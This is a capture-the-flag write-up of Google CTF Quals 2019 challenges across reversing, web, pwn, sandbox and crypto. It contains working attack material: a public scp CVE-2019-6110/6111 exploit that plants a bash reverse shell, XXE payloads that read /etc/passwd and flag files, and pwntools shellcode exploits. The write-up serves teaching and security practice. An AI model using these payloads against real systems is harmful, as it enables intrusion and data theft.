# Google CTF Quals 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190622-googlectfquals/) of this writeup.**


 - [Google CTF Quals 2019](#google-ctf-quals-2019)
   - [Reverse](#reverse)
     - [Malvertising](#malvertising)
       - [First stage](#first-stage)
       - [Second stage](#second-stage)
       - [Third stage](#third-stage)
     - [Flaggy Bird](#flaggy-bird)
     - [Dialtone](#dialtone)
       - [TL;DR](#tldr)
   - [Misc](#misc)
     - [Doomed to Repeat It](#doomed-to-repeat-it)
     - [bob needs a file](#bob-needs-a-file)
   - [Hardware](#hardware)
     - [flagrom](#flagrom)
       - [TL;DR](#tldr-1)
     - [Remote Control](#remote-control)
       - [TL;DR](#tldr-2)
     - [minetest](#minetest)
       - [TL;DR](#tldr-3)
   - [Web](#web)
     - [BNV](#bnv)
     - [gLotto](#glotto)
       - [TL;DR](#tldr-4)
   - [Pwn](#pwn)
     - [MicroServiceDaemonOS](#microservicedaemonos)
     - [Secure Boot](#secure-boot)
   - [Sandbox](#sandbox)
     - [DevMaster 8000](#devmaster-8000)
     - [DevMaster 8001](#devmaster-8001)
     - [sandbox-caas](#sandbox-caas)
   - [Crypto](#crypto)
     - [reality](#reality)
       - [TL;DR](#tldr-5)
     - [Quantum Key Distribution](#quantum-key-distribution)
       - [TL;DR](#tldr-6)
     - [Reverse a cellular automata](#reverse-a-cellular-automata)
       - [TL;DR](#tldr-7)


## Reverse

### Malvertising

#### First stage
* We got a webpage in this challenge, and the only interesting thing is a java script file `src/metrics.js`
* We can tell that it uses some obfuscation techniques. But we can use function `b` to decode the encoded string.
* In the end of `src/metrics.js`, you can find out the following code.

```javascript=
var s = b('0x16', '%RuL');
var t = document[b('0x17', 'jAUm')](b('0x18', '3hyK'));
t[b('0x19', 'F#*Z')] = function() {
    try {
        var u = steg[b('0x1a', 'OfTH')](t);
    } catch (v) {}
    if (Number(/\x61\x6e\x64\x72\x6f\x69\x64/i [b('0x1b', 'JQ&l')](navigator[b('0x1c', 'IfD@')]))) {
        s[s][s](u)();
    }
};
```

* It use regex to match the string 'android' in useragent. So the first stage needs you to modify your useragent
#### Second stage 

* Then we have another js file `src/uHsdvEHFDwljZFhPyKxp.js`

```javascript
var T = {};
T.e0 = function(a, b) {
    var c, d, e;
    return a = String(a), b = String(b), 0 == a.length ? '' : (c = T.f0(a.u0()), d = T.f0(b.u0().slice(0, 16)), c.length, c = T.e1(c, d), e = T.longsToStr(c), e.b0())
}, T.d0 = function(a, b) {
    var c, d;
    return a = String(a), b = String(b), 0 == a.length ? '' : (c = T.f0(a.b1()), d = T.f0(b.u0().slice(0, 16)), c.length, c = T.d1(c, d), a = T.longsToStr(c), a = a.replace(/\0+$/, ''), a.u1())
}, T.e1 = function(a, b) {
    var c, d, e, f, g, h, i, j, k;
    for (a.length < 2 && (a[1] = 0), c = a.length, d = a[c - 1], e = a[0], f = 2654435769, i = Math.floor(6 + 52 / c), j = 0; i-- > 0;)
        for (j += f, h = 3 & j >>> 2, k = 0; c > k; k++) e = a[(k + 1) % c], g = (d >>> 5 ^ e << 2) + (e >>> 3 ^ d << 4) ^ (j ^ e) + (b[3 & k ^ h] ^ d), d = a[k] += g;
    return a
}, T.d1 = function(a, b) {
    for (var c, d, e, f = a.length, g = a[f - 1], h = a[0], i = 2654435769, j = Math.floor(6 + 52 / f), k = j * i; 0 != k;) {
        for (d = 3 & k >>> 2, e = f - 1; e >= 0; e--) g = a[e > 0 ? e - 1 : f - 1], c = (g >>> 5 ^ h << 2) + (h >>> 3 ^ g << 4) ^ (k ^ h) + (b[3 & e ^ d] ^ g), h = a[e] -= c;
        k -= i
    }
    return a
}, T.f0 = function(a) {
    var b, c = new Array(Math.ceil(a.length / 4));
    for (b = 0; b < c.length; b++) c[b] = a.charCodeAt(4 * b) + (a.charCodeAt(4 * b + 1) << 8) + (a.charCodeAt(4 * b + 2) << 16) + (a.charCodeAt(4 * b + 3) << 24);
    return c
}, T.longsToStr = function(a) {
    var b, c = new Array(a.length);
    for (b = 0; b < a.length; b++) c[b] = String.fromCharCode(255 & a[b], 255 & a[b] >>> 8, 255 & a[b] >>> 16, 255 & a[b] >>> 24);
    return c.join('')
}, 'undefined' == typeof String.prototype.u0 && (String.prototype.u0 = function() {
    return unescape(encodeURIComponent(this))
}), 'undefined' == typeof String.prototype.u1 && (String.prototype.u1 = function() {
    try {
        return decodeURIComponent(escape(this))
    } catch (a) {
        return this
    }
}), 'undefined' == typeof String.prototype.b0 && (String.prototype.b0 = function() {
    if ('undefined' != typeof btoa) return btoa(this);
    if ('undefined' != typeof Buffer) return new Buffer(this, 'utf8').toString('base64');
    throw new Error('err')
}), 'undefined' == typeof String.prototype.b1 && (String.prototype.b1 = function() {
    if ('undefined' != typeof atob) return atob(this);
    if ('undefined' != typeof Buffer) return new Buffer(this, 'base64').toString('utf8');
    throw new Error('err')
}), 'undefined' != typeof module && module.exports && (module.exports = T), 'function' == typeof define && define.amd && define([''], function() {
    return T
});

function dJw() {
    try {
        return navigator.platform.toUpperCase().substr(0, 5) + Number(/android/i.test(navigator.userAgent)) + Number(/AdsBot/i.test(navigator.userAgent)) + Number(/Google/i.test(navigator.userAgent)) + Number(/geoedge/i.test(navigator.userAgent)) + Number(/tmt/i.test(navigator.userAgent)) + navigator.language.toUpperCase().substr(0, 2) + Number(/tpc.googlesyndication.com/i.test(document.referrer) || /doubleclick.net/i.test(document.referrer)) + Number(/geoedge/i.test(document.referrer)) + Number(/tmt/i.test(document.referrer)) + performance.navigation.type + performance.navigation.redirectCount + Number(navigator.cookieEnabled) + Number(navigator.onLine) + navigator.appCodeName.toUpperCase().substr(0, 7) + Number(navigator.maxTouchPoints > 0) + Number((undefined == window.chrome) ? true : (undefined == window.chrome.app)) + navigator.plugins.length
    } catch (e) {
        return 'err'
    }
};
a = "A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng=="
eval(T.d0(a, dJw()));
```

* After some investigations, I found out that T.d0() is actually doing XXTEA decryption. And it took dJw() as key.
* dJw() will take your browser information and generate a string like `ANDRO00000ZH0000011MOZILLA010`. But XXTEA only took first 16 bytes, so only the first 16 bytes matter.
* Just bruteforce all the possible combinations. We can find out the key is `LINUX10000FR1000`

#### Third stage

* Still, we got a js file `src/npoTHyBXnpZWgLorNrYc.js`.
* It use the similar trick in first script to encode strings.
* You just decode all the strings in the script then you can find out the last js file `src/WFmJWvYBQmZnedwpdQBU.js`
* In that script you can get the flag `CTF{I-LOVE-MALVERTISING-wkJsuw}` 


### Flaggy Bird

Use jadx to decompile the java code.
The program would read "level%d.bin".
"level%d.bin" is a gziped game map, move the flag button next to the player.
But there is no flag...
Check the code and discover that need to put EGG in EGG_HOLDER.
And there is a lib name "library".
The `M` function is a merge sort.
The `C` function will a the input 2 by 2.
Using `mountain climbing algorithm` to solve the problem.

```C++=
// by qazwsxedcrfvtg14
#include<bits/stdc++.h>
#define f first
#define s second
using namespace std;
typedef pair<int,int>par;
typedef pair<par,char>pr;
#define __int64 long long
int c;
int p;
int d[]={0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0};
int XD;
unsigned long long M(char *dest, signed int a2)
{
  __int64 v2; // r13
  int v3; // er12
  char *v4; // rbp
  __int64 v5; // rbx
  int v6; // er14
  signed int v7; // eax
  char v8; // dl
  __int64 v9; // rbp
  char desta[16]; // [rsp+10h] [rbp-48h]
  unsigned __int64 v12; // [rsp+20h] [rbp-38h]

  v12 = (0x28u);
  if ( a2 >= 2 )
  {
    v2 = (unsigned int)a2 >> 1;
    M(dest, (unsigned int)a2 >> 1);
    if ( c )
    {
      v3 = a2 - v2;
      v4 = &dest[v2];
      M(&dest[v2], a2 - v2);
      XD++;
      if ( c )
      {
        if ( v3 > 0 )
        {
          v5 = 0LL;
          v6 = 0;
          v7 = 0;
          while ( 1 )
          {
            v8 = v4[v6];
            if ( dest[v7] >= v8 )
            {
              if ( dest[v7] <= v8 || d[p] )
              {
                LABEL_15:
                c = 0;
                return (0x28u);
              }
              ++p;
              desta[v5] = v4[v6++];
            }
            else
            {
              if ( d[p] != 1 )
                goto LABEL_15;
              ++p;
              desta[v5] = dest[v7++];
            }
            ++v5;
            if ( v7 >= (signed int)v2 || v6 >= v3 )
              goto LABEL_17;
          }
        }
        v7 = 0;
        v6 = 0;
        v5 = 0;
        LABEL_17:
        if ( v7 < (signed int)v2 )
        {
          v9 = (unsigned int)(v2 - 1 - v7);
          memcpy(&desta[(signed int)v5], &dest[v7], v9 + 1);
          v5 = v5 + v9 + 1;
        }
        if ( v6 < v3 )
          memcpy(&desta[(signed int)v5], &dest[v2 + v6], (unsigned int)(a2 - 1 - v6 - v2) + 1LL);
        memcpy(dest, desta, a2);
      }
    }
  }
  return (0x28u);
}
char inp[16];
char s[16];
char best[16];
char ss[100];
int main(){
    for(int i=0;i<16;i++)
      s[i]=best[i]=i;
    string t;
    srand(87);
    c=1;
    p=0;XD=0;
    M(s,16);
    int bst=p;
    printf("%d %d %d %d\n",c,p,XD,bst);
    for(int i=0;i<16;i++)
        printf("%02x ",s[i]);
    getline(cin,t);
    while(true)
    for(int x=0;x<16*31;x++){
        c=1;
        p=0;
        int k=5;
        if(bst>=20)k=4;
        if(bst>=30)k=3;
        if(bst>=38)k=2;
        for(int i=0;i<k;i++)
          swap(s[rand()%16],s[rand()%16]);
        for(int i=0;i<16;i++){
            printf("%02x ",s[i]);
            inp[i]=s[i];
        }
        puts("");
        XD=0;
        M(s,16);
        printf("> ");
        for(int i=0;i<16;i++)
            printf("%02x ",s[i]);
        puts("");
        printf("%d %d %d %d\n",c,p,XD,bst);
        if(p>bst){
            bst=p;
            for(int i=0;i<16;i++)
                best[i]=inp[i];
            for(int i=0;i<16;i++)
                fprintf(stderr,"%02x ",inp[i]);
            fprintf(stderr,"\n");
            getline(cin,t);
            if(c==1)return 0;
        }
        else{
            for(int i=0;i<16;i++)
                s[i]=best[i];
        }
    }
    return 0;
}

```
And will find this input can pass `M` and `C`
`0x09,0x08,0x07,0x02,0x0b,0x0f,0x0d,0x0a,0x06,0x05,0x0e,0x04,0x03,0x00,0x0c,0x01`

And the java code says, there only 15 EGG_HOLDER can hold EGG.
So brute force 2^15 possible of input which would satisfy the sha256.
`sha-256: 2e325c91c91478b35c2e0cb65b7851c6fa98855a77c3bfd3f00840bc99ace26b`

Input the final array into the game, and get the flag.

flag: `CTF{Up_d0WN_TAp_TAp_TAp_tHe_b1rd_g0Es_flaG_flaG_flaG}`

### Dialtone
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/rev/dial/).

#### TL;DR
1. Reverse the executable
2. Extract the sequence from switch case.
3. Convert to value using a DTMF keypad table.


## Misc

### Doomed to Repeat It

Look the source code `random.go`, and there only 131072 possible game.
Just write a program to get all of the game.

```C++=
#include<bits/stdc++.h>
#include"Jtol.h" //https://github.com/qazwsxedcrfvtg14/Jtol.Linux
#include "openssl/sha.h"
#include "argon2.h"
using namespace Jtol;
using namespace std;
typedef unsigned long long ull;
typedef const unsigned long long cull;
string argon2(ull input){
    char has[8];
    argon2id_hash_raw(1, 2*1024, 2, (uint8_t*)&input, 8, (uint8_t*)&input, 8, has, 8);
    return string(has,8);
}
vector<int> god[1<<20];
int main(){
    mutex mut;
    Thread th[16];
    for(int t=0;t<16;t++){
        th[t]=ThreadCreate([&](int tid){
            for(ull i=tid;i<(1<<17);i+=16){
                ull raw_seed=i*14496946463017271296ull;
                string seed=argon2(raw_seed);
                printf("%d\n",i);
                char buf[16];
                vector<int>ve;
                for(int j=0;j<56;j++)
                    ve.push_back(j/2);
                int x=0;
                for(int j=56-1;j>=0;j--){
                    int k=-1;
                    ull n=j+1;
                    while(true){
                        *((ull*)&(buf[0]))=x++;
                        *((ull*)&(buf[8]))=*(ull*)(seed.c_str());
                        MD5 m5 = MD5(string(buf,16));
                        ull v=*((ull*)&m5.digest[0]);
                        ull possibleRes = v % n;
                        ull timesPassed = v / n;
                        if (timesPassed == 0) {
                            k=possibleRes;
                            break;
                        }
                        ull distancePassed = timesPassed * n;
                        ull distanceLeft = 0 - distancePassed;
                        if (distanceLeft >= n){
                            k=possibleRes;
                            break;
                        }
                    }
                    swap(ve[j],ve[k]);
                }
                mut.lock();
                god[ve[0]|(ve[1]<<5)|(ve[2]<<10)|(ve[3]<<15)]=ve;
                mut.unlock();
            }
        },t);
    }
    for(int t=0;t<16;t++)
        Wait(th[t]);
    puts("");
    while(true){
        int a,b,c,d;
        scanf("%d%d%d%d",&a,&b,&c,&d);
        puts("");
        int cnt=0;
        for(int x:god[a|(b<<5)|(c<<10)|(d<<15)]){
            printf("%2d ",x);cnt++;
            if(cnt%7==0)puts("");
        }
        puts("");
    }
    return 0;
}
```
flag: `CTF{PastPerf0rmanceIsIndicativeOfFutureResults}`

### bob needs a file
`scp` CVE-2019-6110 CVE-2019-6111, there is a poc available: https://gist.github.com/mehaase/63e45c17bdbbd59e8e68d02ec58f4ca2

The server will scp a file `data.txt` from the given ip:2222, and output the "result" to ip:2223. Here is the result from the server:

```
## generated by generatereport
## generatereport failed. Error: unknown
```

One intuition is that the server will execute the file `generatereport` and return the result to ip:2223. Turned out our assumption was correct as we didn't receive any response if we overwrite the file `generatereport`. Thus, we can overwrite `generatereport` to a reverseshell bash script to get a shell.

```python
# Exploit Title: SSHtranger Things
# Date: 2019-01-17
# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>
# Vendor Homepage: https://www.openssh.com/
# Software Link: [download link if available]
# Version: OpenSSH 7.6p1
# Tested on: Ubuntu 18.04.1 LTS
# CVE : CVE-2019-6111, CVE-2019-6110

import base64
import gzip
import logging
import paramiko
import paramiko.rsakey
import socket
import threading

logging.basicConfig(level=logging.INFO)

dummy = 'cat /etc/passwd\n'

payload = '#!/bin/bash\nbash -i >& /dev/tcp/<your ip>/2223 0>&1'

class ScpServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        logging.info('Authenticated with %s:%s', username, password)
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        logging.info('Opened session channel %d', chanid)
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_exec_request(self, channel, command):
        command = command.decode('ascii')
        logging.info('Approving exec request: %s', command)
        parts = command.split(' ')
        # Make sure that this is a request to get a file:
        assert parts[0] == 'scp'
        assert '-f' in parts
        file = parts[-1]
        # Send file from a new thread.
        threading.Thread(target=self.send_file, args=(channel, file)).start()
        return True

    def send_file(self, channel, file):
        '''
        The meat of the exploit:
            1. Send the requested file.
            2. Send another file (exploit.txt) that was not requested.
            3. Print ANSI escape sequences to stderr to hide the transfer of
               exploit.txt.
        '''
        def wait_ok():
            assert channel.recv(1024) == b'\x00'
        def send_ok():
            channel.sendall(b'\x00')

        wait_ok()

        logging.info('Sending requested file "%s" to channel %d', file,
            channel.get_id())
        command = 'C0664 {} {}\n'.format(len(dummy), file).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(dummy)
        send_ok()
        wait_ok()

        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'exploit.txt' instead.
        logging.info('Sending malicious file "exploit.txt" to channel %d',
            channel.get_id())

        command = 'C0777 {} generatereport\n'.format(len(payload)).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(payload)
        send_ok()
        wait_ok()

        # This is CVE-2019-6110: the client will display the text that we send
        # to stderr, even if it contains ANSI escape sequences. We can send
        # ANSI codes that clear the current line to hide the fact that a second
        # file was transmitted..
        logging.info('Covering our tracks by sending ANSI escape sequence')
        channel.sendall_stderr("\x1b[1A".encode('ascii'))
        channel.close()

def main():
    logging.info('Creating a temporary RSA host key...')
    host_key = paramiko.rsakey.RSAKey.generate(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 2222))
    sock.listen(0)
    logging.info('Listening on port 2222...')

    while True:
        client, addr = sock.accept()
        logging.info('Received connection from %s:%s', *addr)
        transport = paramiko.Transport(client)
        transport.add_server_key(host_key)
        server = ScpServer()
        transport.start_server(server=server)

if __name__ == '__main__':
    main()
```

Flag: `CTF{0verwr1teTh3Night}`

## Hardware

### flagrom
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/hardware/flagrom/).

#### TL;DR
1. Communicate to the EEPROM using raw I²C GPIO.
2. Set the `i2c_address_valid` bit using address 0.
3. Force reset the state by trigging `i2c_start`.
4. Lock all pages.
5. Force reset the state by trigging `i2c_start`.
6. Read the whole memory out.

### Remote Control
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/hardware/remote/).

#### TL;DR
1. Guess 🤔
2. Guess again 🤔
3. Guess once again 🤔
4. Send a NEC IR message using that IOT hub.


### minetest
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/hardware/minetest/).

#### TL;DR
1. Parse the map database.
2. Dump all mesecons blocks' type, orientation, and position.
3. Simplify all interconnections.
4. Solve the boolean expression with z3.


## Web

### BNV

This challenge uses javascript to encode our selection to braille code.

(https://www.pharmabraille.com/pharmaceutical-braille/the-braille-alphabet/)

And it will send the data to `/api/search` with content-type `application/json`.

If we try to change the content-type to `application/xml`, it will return XML Parse Error.

So we know that target server supports XML format as input.

And there is no response output for xxe payload:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]> 
<message>&xxe;</message>
```

But if we try existent file, it will return `No result found`

And if we try non-existent file, it will return Error: `Failure to process entity xxe, line 6, column 15`

So there is a blind XXE, we need to exfiltrate the result of XXE.

<br>

This challenge disable http request, so we can't use out-of-band XXE.

Then, I try the Error-based XXE to bring the result into error message.

(https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

payload:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
```

![](https://i.imgur.com/Y5Qf1bn.png)


flag: `CTF{0x1033_75008_1004x0}`

### gLotto
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/web/glotto/).

#### TL;DR
1. Concatenate part of the secret to winner, and order by its MD5 hash.
2. Pre-compute a mapping from permutation to secret offline.
3. Use SQL injection to order the result by our comparing function
4. Map the permutation back to a possible secret
5. Keep trying until the flag pops up.



## Pwn
### MicroServiceDaemonOS

There are two command `l` for creating two different type object, `c` for executing the object function created by `l` command. 

Each object has its own execution section with 2 pages and data section with 0x7ff8 pages created by mmap, and different functionalities. And these mmap region are continuous.


In type 0 object, there is a function can calculate each page hash value and print to the screen. 

In type 1 object, there is a function can write random value to its own `init_random+user_offset`th page of data section. `user_offset` is user input value without any check that we can control, and `init_random`  is initalized at program start.

So, we can construct our exploit. 
Creating type 0 object and type 1 object respectly, using object 2 write some data onto the data section of first object.
And using functionality of object 1, leak the `init_random`.

Thus, we can write our shellcode byte by byte to the execution section of object.

Get Shell!


```python
from pwn import *

r = process(["./MicroServiceDaemonOS"])
#r = remote("microservicedaemonos.ctfcompetition.com", 1337)
r.sendlineafter(":","l")
r.sendlineafter(":","0")
r.sendlineafter(":","l")
r.sendlineafter(":","1")
r.sendlineafter(":","c")
r.sendlineafter(":","1")
r.sendlineafter(":","s")
r.sendlineafter(":",str(0x40))
r.sendlineafter(":","-"+str(0x8000000))
r.send("a"*0x40)

r.sendlineafter("command:","c")
r.sendlineafter(":","0")
r.sendlineafter(":","g")
r.sendlineafter(":","0")
r.sendlineafter(": ",str(0x7fd8))
data = r.recvn(0x7fd8*4)
data = [ data[i:i+4] for i in range(0,len(data),4)]
A,B = set(data)
if A==data[0]:
    A = B
idx = data.index(A)
context.arch = "amd64"
shellcode = asm("""
push rax
pop rsi
xor eax,eax
push rax
pop rdi
syscall
""")

for i in range(len(shellcode)):
    while True:
        print(i, len(shellcode))
        r.sendlineafter(":","c")
        r.sendlineafter(":","1")
        r.sendlineafter(":","s")
        r.sendlineafter(":",str(1))
        r.sendlineafter(": ","-"+str(idx*0x1000+0x4000-i))
        r.send("a")
        if r.recvn(1) == shellcode[i]:
            break
r.sendlineafter(":","c")
r.sendlineafter(":","1")
r.sendlineafter(":","g")
r.send("\x90"*0x10+asm(shellcraft.sh()))
r.interactive()

```

### Secure Boot
The goal of the challenge is very clear, just boot the machine successfully. But this machine was enabled Secure Boot Configuration, thus if boot it directly, we will get this messege:

```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)

...

Booting...
Script Error Status: Security Violation (line number 5)

```
Try some hotkey like `ESC`, it will enter the BIOS interface and ask for the password:

```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?

```
* Use `uefi-firmware-parser` to extract dll files from `OVMF.fd`:

```shell=
uefi-firmware-parser ./OVMF.fd -e

```
We'll get several dll files:

```
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Application/UiApp/UiApp/DEBUG/UiApp.dll
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Universal/BdsDxe/BdsDxe/DEBUG/BdsDxe.dll
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/OvmfPkg/Sec/SecMain/DEBUG/SecMain.dll
...

```
First check out the `UiApp.dll` for reversing BIOS. There is a simple overflow, password buffer has the length 0x80 byte, but we are able to input 0x8b byte to it, it can just right overwrite the data pointer for 4 byte.
For now, we can write everywhere. We decided to overwrite some function pointer to continue booting, but the content to write was uncontrollable, it like the hash value of the password.
Finally we decided to find the password which last byte of hash is nearby enough offset, return address is at `0x7ec18b8`, we overwrite the pointer with `0x7ec18b8 - 0x20 + 1` to overflow the return address for just one byte.
For this password payload:

```python
p = '\x05' * 0x20
p = p.ljust( 0x20 , '\x01' )
p = p.ljust( 0x88 , 'a' )
p += p32( 0x7ec18b8 - 0x20 + 1 )

```
the last byte of hash value of this password is `\x13`, and the original return address is `0x67d4d34`. We overflow it to let it become `0x67d4d13`:

```nasm
   0x67d4d13:	sbb    BYTE PTR [rcx],al
   0x67d4d15:	add    dh,al
   0x67d4d17:	add    eax,0x11dfc
   0x67d4d1c:	add    DWORD PTR [rcx+0x11e9d05],ecx
   0x67d4d22:	add    BYTE PTR [rbx+0x118a705],cl
   0x67d4d28:	add    BYTE PTR [rcx+0x11e8d05],cl
   0x67d4d2e:	add    al,ch
   0x67d4d30:	sbb    al,0x61
   0x67d4d32:	add    BYTE PTR [rax],al
   0x67d4d34:	test   al,al
   0x67d4d36:	jne    0x67d4d49
   0x67d4d38:	lea    rcx,[rip+0xa11f]        # 0x67dee5e
   0x67d4d3f:	call   0x67cc3fd
   0x67d4d44:	jmp    0x67d5eb6
=> 0x67d4d49:	cmp    BYTE PTR [rip+0x11e00],0x0        # 0x67e6b50

```
It didn't crash, that was awesome! The `al` was not zero now, so that it will bypass `test al,al` checking and took the branch at `jne    0x67d4d49` then entered the BIOS.
For now, just use some control keys `UP DOWN LEFT RIGHT` to control the BIOS interface.
Disable Secure Boot Configuration, and reset:
* Enter Device Manager
![](https://i.imgur.com/EWx5VU0.png)
* Enter Secure Boot Configuration
![](https://i.imgur.com/7ybGzs7.png)
* Disable it!
![](https://i.imgur.com/YVg0Rjq.png)
* Enjoty the machine.
![](https://i.imgur.com/OIIsQfS.png)

Flag: `CTF{pl4y1ng_with_v1rt_3F1_just_4fun}`

## Sandbox
### DevMaster 8000
* Use client to grab flag

```bash=
./client nc devmaster.ctfcompetition.com 1337 \
-- -- -- ../../drop_privs admin admin cat ../../flag

```
flag : `CTF{two-individually-secure-sandboxes-may-together-be-insecure}`

### DevMaster 8001
The fetch command in the server process has a symlink race condition. First we created a normal file in the sandbox and fetched it. During the fetch command, we rapidly flipped the target file betwen a symlink pointing to the flag file and a normal file. If the target file is a normal file when doing the file check and gets changed to the symlink when reading its content, we can donwload the flag file.

flag : `CTF{devMaster-8001-premium-flag}`


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
        while (1) {
                close(open("c.out", O_CREAT));
                symlink("/home/user/flag", "d.out");
                rename("c.out", "b.out");
                rename("d.out", "b.out");
        }
        return 0;
}

```

### sandbox-caas
* Double fetch Host cause connect failed
* Receive connect failed socket fd from RPC Server
* Because this socket is fetch from out of sandbox, it's Network Namespace is different from sandbox
* We can connect to flag server by this socket

flag : `CTF{W3irD_qu1rKs}`


```python
from pwn import *
context.arch = "amd64"

r = remote("caas.ctfcompetition.com", 1337)

context.arch = "amd64"

shellcode = ""

shellcode += asm(shellcraft.pushstr("127.0.0.1"))

shellcode += asm("""
mov r15,rsp
push 0
push 8080
push r15
mov rsi,rsp
mov rdi,100
mov rdx,24
mov rax,1
syscall
""") #send connect req


shellcode += asm("""
add r15,8
mov rsi,r15
mov rax,0
mov rdi,0
mov rdx,0x1
syscall
 """) #read and change host


shellcode += asm("""
mov rax,0
mov rdi,100
mov rsi,rsp
mov rdx,16
syscall
""") #receive resp


shellcode += asm("""
sub rsp,1
mov r14,rsp
push 1
push r14
mov r14,rsp
sub rsp,0x800
mov r13,rsp
push 0
push 0x800
push r13
push 1
push r14
push 0
push 0
mov rsi,rsp
mov rdi,100
mov rdx,0
mov rax,47
syscall""") #recieve fd


shellcode += asm("""
mov rbx,0x0100007f0a1a0002
push 0
push rbx
mov rsi,rsp
mov rdi,3
mov rdx,0x10
mov rax,42
syscall """) #connect


shellcode += asm("""
mov rdi,0x3
mov rsi,rsp
mov rdx,0x100
mov rax,0
syscall
mov rdx,rax
mov rdi,1
mov rsi,rsp
mov rax,1
syscall
""") #read fd

r.recvuntil("assembly")
r.send(p16(len(shellcode))+shellcode)
time.sleep(0.0015)
r.send("2")

r.interactive()


```


## Crypto

### reality
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/crypto/reality/).

#### TL;DR
1. Guess what the service does
2. Multiply $10^{450}$ to each number and truncate the fraction to integer
3. Build the lattice
4. Run LLL to find the shortest integer solution
5. Decrypt the flag with AES-CBC


### Quantum Key Distribution
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/crypto/qkd/).

#### TL;DR
1. Exchange shared secret using BB84 protocol
2. Convert the bit string to char string with correct order
3. XOR the secret and encryped key to decrypt it


### Reverse a cellular automata
Read the full writeup [here](https://sasdf.cf/ctf/writeup/2019/google/crypto/cell/).

#### TL;DR
1. Use DFS to find the key
2. Decrypt the flag with all those key
3. Find the flag which contains `CTF`
